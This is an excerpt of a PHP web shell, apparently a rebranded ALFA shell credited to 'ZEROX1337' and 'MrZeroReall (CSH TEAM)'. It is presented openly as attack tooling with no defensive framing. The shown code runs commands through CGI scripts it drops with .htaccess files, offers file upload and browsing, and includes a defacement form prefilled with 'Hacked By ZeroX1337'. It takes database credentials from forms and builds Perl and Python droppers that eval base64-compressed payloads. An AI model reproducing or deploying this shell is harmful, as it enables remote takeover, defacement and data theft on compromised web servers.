...
$GLOBALS['DB_NAME'] = $GLOBALS['ZEROX1337'];
...
define("__ALFA_CODE_NAME__", "@MrZeroReall");
define("__ALFA_DATA_FOLDER__", "ZEROX1337");
...
<center><img style="border-radius:100px;"width="500" height="250" alt="ZEROX1337 X CSH TEAM" draggable="false" src="https://s12.gifyu.com/images/bkXmo.gif" /></center>
<div id=loginbox><p><font face="DejaVu Sans" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="gold"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="black" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="Georgia"><b>ZEROX1337 X CSH TEAM</b></font></th></tr>
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if($is_curl||$is_socket){
		$recreate = false;
		if(isset($_COOKIE["ZEROXCSHTEAM"])){
			if(!@file_exists("ZEROXCSHTEAM/".$_COOKIE["ZEROXCSHTEAM"].".haxor")){
				$recreate = true;
				$lang = $_COOKIE["ZEROXCSHTEAM"];
			}
		}
		if(!isset($_COOKIE["ZEROXCSHTEAM"])||$recreate){
			...
			alfacgihtaccess('cgi', "ZEROXCSHTEAM/");
		}else{
			$lang = $_COOKIE["ZEROXCSHTEAM"];
		}
		$cgi_ext = ".haxor";
		...
		$cgi_url = __ALFA_DATA_FOLDER__."/ZEROXCSHTEAM/".$lang.$cgi_ext;
		...
		if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
				__alfa_set_cookie("ZEROXCSHTEAM", $lang);
			}
			...
			if($set_cookie){
				__alfa_set_cookie("ZEROXCSHTEAM", "off");
			}
		}
		return trim($out);
	}else{
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ ZEROX1337 ::..</title>
<style type="text/css">';?>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="250" height="170" alt="lph team 2023" draggable="false" src="https://s12.gifyu.com/images/bkXmo.gif" /></td>
</tr>
<tr>
...
function __showicon($r){
	$s['btn']='https://l.top4top.io/p_3238iehjw4.png';
	$s['alfamini']='https://l.top4top.io/p_3238iehjw4.png';
	$s['loader']='https://l.top4top.io/p_37374hln71.png';
...
if(empty($about_us)){
$about_us = "<pre><center><img src='https://l.top4top.io/p_3238iehjw4.png'><br>
<font color='#FFFFFF'>Shell ReCoded By MrZeroReall (CSH TEAM)</font><br>
<font color='#00A220'>Contact : mrzeroghostcode@pm.me</font><br>
...
function alfacheckupdate(){
	if($GLOBALS["DB_NAME"]["cgi_api"]){
		if(!isset($_COOKIE["ZEROXCSHTEAM"])&&!isset($_COOKIE["ZEROXCSHTEAM"])){
...
if($_POST['alfa2']&&$_POST['alfa2']=='>>'){
echo__pre()."<p><center><textarea rows='10' name='users' cols='80'>";
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ZEROX1337 &copy; 2023-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"HACKED BY ZEROX1337\");' style='color: #E91E63;text-decoration: none;'>Contact Me at</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>MrZeroReall</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/MrZeroReall'>@MrZeroReall</a></span></div></td>
</tr>
</table>
</div>
...
function alfaFilesMan2(){
	...
	echo '<div style="position:relative;" fm_id="1" id="filesman_holder_1" class="ajaxarea filesman-active-content"><divclass="header"></div></div>';
	alfaFooter();
}
...
<textarea name=index rows='19' cols='103'><title>Hacked By ZeroX1337</title><b>Hacked By ZeroX1337</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
$s0levisible="Powered By  ZEROX1337";
$dbu = $_POST['alfa6'];
$path = $_POST['alfa5'];
$fname = $_POST['alfa4'];
$dbn = $_POST['alfa7'];
...
if($_POST['alfa8']=='>>'){
$s0levisible="Powered By MrZeroReall";
$dbu = $_POST['alfa2'];
$dbn = $_POST['alfa3'];
$dbp = $_POST['alfa4'];
$dbh = $_POST['alfa5'];
...
<title>Hacked By ZeroX1337</title><b>Hacked By ZeroX1337</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
if(isset($_POST['alfa2'])&&($_POST['alfa2']=='symperl'||$_POST["alfa2"]=="sympy")){
	...
	@chdir('cgihaxor');
	alfacgihtaccess('cgi');
	$perl = '#!/usr/bin/perl   -I/usr/local/bandmin'."\n".'use MIME::Base64;use Compress::Zlib;my $alfa_data="'.__ALFA_DATA_FOLDER__.'";eval(Compress::Zlib::memGunzip(decode_base64("")));';
	$py = '#!/usr/bin/python'."\nimport zlib, base64\nalfa_data='".__ALFA_DATA_FOLDER__."'\n".'eval(compile(zlib.decompress(base64.b64decode("")),\'<string>\',\'exec\'))';
...
echo "<div class=header>";
echo "
<center><p><img src=\"https://h.top4top.io/p_3737zyi111.jpg\"></p>";
...
$bash_users  = alfaEx("cd ".$tmp_path."/ZEROXCSHTEAM;sh basedir.haxor ".$makepwd,false,true,true);
